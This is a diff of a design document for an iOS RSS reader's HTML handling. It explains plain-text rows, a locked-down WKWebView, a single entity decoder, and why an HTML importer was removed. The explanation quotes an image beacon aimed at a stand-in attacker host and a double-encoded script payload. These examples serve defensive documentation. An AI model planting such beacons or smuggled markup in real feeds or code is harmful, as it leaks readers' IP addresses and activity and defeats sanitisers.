@@ -1,182 +1,104 @@
 # HTML Rendering in RSS Feeds
 
 ## Problem
-RSS feeds often include HTML markup in article descriptions, like:
-```
+
+RSS feeds put HTML markup in article descriptions and content:
+
+```html
 <p>This is a <strong>great</strong> article about <a href="...">SwiftUI</a></p>
 ```
 
-Without proper handling, this displays as raw text with tags visible.
+Displayed naively, the tags show up as literal text. Displayed carelessly, the
+markup executes.
 
-## Solution Implemented
+## How the app renders feed HTML today
 
-I've added native HTML rendering using SwiftUI's `AttributedString`. This gives you:
+There are exactly two paths, chosen by how much trust and formatting the surface needs.
 
-✅ **Proper formatting** - Bold, italic, underline all work
-✅ **Native look** - Matches iOS design perfectly
-✅ **Links** - Clickable links in text (though tapping opens the article)
-✅ **No WebView needed** - Lightweight and fast
-✅ **Fallback handling** - If HTML parsing fails, strips tags gracefully
+### 1. List rows and inline descriptions — plain text, no HTML engine
 
-## What Was Added
-
-### 1. HTML Helper Utilities (`Utilities/HTMLHelper.swift`)
-
-**Three useful extensions on String:**
+Rows render the pre-computed plain-text form:
 
 ```swift
-// Converts HTML to formatted AttributedString
-"<p>Hello <b>world</b></p>".htmlToAttributedString
-
-// Strips all HTML tags for plain text
-"<p>Hello <b>world</b></p>".htmlToPlainText  // "Hello world"
-
-// Quick check for HTML content
-"<p>Hello</p>".strippingHTML
+article.plainTextDescription ?? article.articleDescription?.htmlToPlainText
 ```
 
-**Common HTML entities are decoded:**
-- `&nbsp;` → space
-- `&amp;` → &
-- `&lt;` → <
-- `&gt;` → >
-- `&quot;` → "
-- `&#39;` → '
+`plainTextDescription` is derived once in `Article.init` (and backfilled for older
+rows by `DatabaseMigration.backfillDerivedArticleFields`), so scrolling never pays
+to strip HTML. The `??` fallback covers rows written before the field existed.
 
-### 2. Updated Article Display Views
+### 2. Article and Reddit bodies — a locked-down WKWebView
 
-**TodayView.swift** - Now uses:
-```swift
-Text(description.htmlToAttributedString)
-```
+Full article content goes through `WKWebView` via `loadHTMLString(..., baseURL: nil)`,
+wrapped by `createStyledHTML(...)`. That path is hardened in three ways, all in
+`WebViewSecurity` (`Views/ArticleDetailSimple.swift`):
 
-Instead of:
-```swift
-Text(description)
-```
+- `allowsContentJavaScript = false` on content configurations
+- a Content-Security-Policy `<meta>` naming no `script-src` under `default-src 'none'`
+- a deny-by-default navigation policy — only the initial in-memory document load is
+  allowed; link taps are cancelled in place and opened externally only if
+  `SafeURL` accepts the scheme
 
-This happens in:
-- Article row previews (2-line limit)
-- Article detail descriptions (full text)
+`EmbeddedMediaWebView` is the one content view that keeps JavaScript enabled, because
+the setting is page-wide and would break the cross-origin oEmbed players it exists to
+frame. Its wrapper document — the only attacker-supplied part — is still script-free
+by CSP.
 
-### 3. Enhanced Article Reader (`Views/ArticleWebView.swift`)
+## String helpers (`Utilities/HTMLHelper.swift`)
 
-**New feature!** You can now:
-- **Read in App** - Opens full article in embedded WebView
-- **Open in Safari** - Original behavior
-
-The WebView includes:
-- Back/forward gestures
-- Phone number and link detection
-- Close button to return to description
-- Safari button to open externally
-
-## How It Works
-
-### Rendering Process:
-1. **Try AttributedString HTML parsing** (iOS 15+, works great)
-2. **Fall back to NSAttributedString** (older method, very reliable)
-3. **Fall back to plain text** (strips all HTML if parsing fails)
-
-### AI Processing:
-The AI service uses `.htmlToPlainText` so it analyzes actual content, not HTML tags.
-
-## Testing
-
-Try these RSS feeds that have lots of HTML:
-
-1. **Daring Fireball** - `https://daringfireball.net/feeds/main`
-   - Rich formatting, italics, links
-
-2. **The Verge** - `https://www.theverge.com/rss/index.xml`
-   - Images, complex HTML
-
-3. **Ars Technica** - `https://feeds.arstechnica.com/arstechnica/index`
-   - Inline code, formatting
-
-## Files Changed
-
-✅ **New:** `Utilities/HTMLHelper.swift` - HTML conversion utilities
-✅ **New:** `Views/ArticleWebView.swift` - In-app article reader
-✅ **Updated:** `Views/TodayView.swift` - Uses HTML rendering
-✅ **Updated:** `Services/AIService.swift` - Uses plain text for analysis
-
-## Usage Examples
-
-### In Your Code:
+All `nonisolated`, so background parsing and sync code can use them under
+`SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor`:
 
 ```swift
-// Display HTML in any SwiftUI view
-Text(htmlString.htmlToAttributedString)
-
-// Or use the helper view
-HTMLText(htmlString, fontSize: 16)
-
-// Get plain text for processing
-let plainText = htmlString.htmlToPlainText
+"<p>Hello <b>world</b></p>".htmlToPlainText     // "Hello world"
+"<p>Hello</p>".strippingHTML                    // tag removal
+"AT&amp;T".decodeHTMLEntities()                 // "AT&T"
 ```
 
-### Custom Styling:
+`decodeHTMLEntities()` is the single canonical decoder for the whole app. It scans
+once and resumes after each replacement, so nothing it emits is re-read as an entity:
+`&amp;lt;` decodes to the literal `&lt;`, never to `<`. Decode exactly once — see below.
 
-```swift
-// The AttributedString preserves HTML styles
-// You can override with SwiftUI modifiers:
-Text(html.htmlToAttributedString)
-    .foregroundStyle(.primary)  // Override color
-    .font(.body)                // Override font
-```
+Supported: `&amp; &lt; &gt; &quot; &apos; &nbsp; &rdquo; &ldquo; &rsquo; &lsquo;
+&mdash; &ndash; &hellip;`, plus numeric (`&#8217;`) and hex (`&#x27;`) references.
+Unknown or malformed references pass through untouched.
 
-## Benefits
+## Removed: `String.htmlToAttributedString`
 
-1. **Better UX** - Articles look professional and formatted
-2. **Native Performance** - No WebView overhead for descriptions
-3. **Accessibility** - VoiceOver reads formatted text correctly
-4. **Fallback Safety** - Never crashes on malformed HTML
-5. **In-App Reading** - Optional WebView for full articles
+The app used to render row descriptions with an `AttributedString` built by
+`NSAttributedString(data:options:[.documentType: .html])`. **It was deleted**, along
+with the `HTMLText` helper view, for two reasons:
 
-## Troubleshooting
+1. **Main-thread hang.** The `.html` importer runs a full WebKit parse. The property
+   was main-actor isolated and called per visible row while scrolling, with no length
+   cap.
+2. **Privacy / SSRF beacon.** The importer synchronously fetches externally referenced
+   subresources. A description containing `<img src="http://attacker/track?u=1">` fired
+   an outbound request from the reader's device — a read-receipt and IP-leak vector
+   driven purely by feed content.
 
-**"Still seeing HTML tags"**
-- Make sure you added `Utilities/HTMLHelper.swift` to your Xcode project
-- Clean build (Shift+Cmd+K) and rebuild
+`TodayTests/RowDescriptionRenderingTests.swift` pins this: it renders the real row and
+detail views with a beacon-carrying description behind a recording `URLProtocol` and
+asserts zero requests, with a control test proving the recorder is actually in the
+loading path.
 
-**"Links don't work"**
-- In article rows, links aren't clickable (by design - tapping opens article)
-- In the WebView reader, all links work normally
+Rich inline formatting in list rows is therefore not currently supported, and that is
+deliberate. Anything needing it must not run on a scrolling path and must not hand
+untrusted markup to an HTML engine that resolves remote subresources.
 
-**"Formatting looks wrong"**
-- Some RSS feeds have broken HTML
-- The fallback strips tags and shows plain text
-- This is expected behavior for malformed HTML
+## Rules when touching this area
 
-**"Images don't show in descriptions"**
-- SwiftUI's AttributedString doesn't render `<img>` tags
-- Use "Read in App" button to see full article with images
-- This is a limitation of native text rendering
-
-## Advanced: Custom HTML Rendering
-
-If you want more control over HTML rendering, you can modify `HTMLHelper.swift`:
-
-```swift
-// Add custom CSS
-let html = """
-<style>
-    body { font-family: -apple-system; color: #333; }
-    a { color: #007AFF; }
-</style>
-\(htmlString)
-"""
-```
-
-Or implement a custom NSAttributedString parser with your own styling rules.
-
-## Next Steps
-
-The HTML rendering is now automatic. Just:
-1. Add the new files to your Xcode project
-2. Build and run
-3. Add RSS feeds
-4. Enjoy properly formatted content!
-
-No configuration needed - it just works! 🎉
+- **Decode entities exactly once.** Double-decoding reconstructs escaped markup
+  (`&amp;amp;lt;script&amp;amp;gt;` → `<script>`) and defeats upstream sanitisers. The
+  view seams go through `WebViewSecurity.decodeForRendering(_:)` so "once" lives in one
+  assertable place.
+- **Never add a second entity decoder.** There is one, in `HTMLHelper.swift`. Four
+  copies previously drifted apart and two of them reconstructed live markup.
+- **Never feed untrusted HTML to `NSAttributedString`'s HTML importer.** That is the
+  bug this document now describes in the past tense.
+- **Every new `WKWebView` needs a navigation delegate.**
+  `WebViewNavigationPolicyTests.testEveryConstructedWebViewHasANavigationDelegate` hosts each
+  WebView-bearing view for real and fails if a constructed `WKWebView` lacks one — but it
+  iterates a **hand-maintained list**, and covers only the iOS variants (the macOS AppKit halves
+  cannot be hosted from the iOS test target). Add your view to that list when you add one; the
+  test cannot discover it for you.
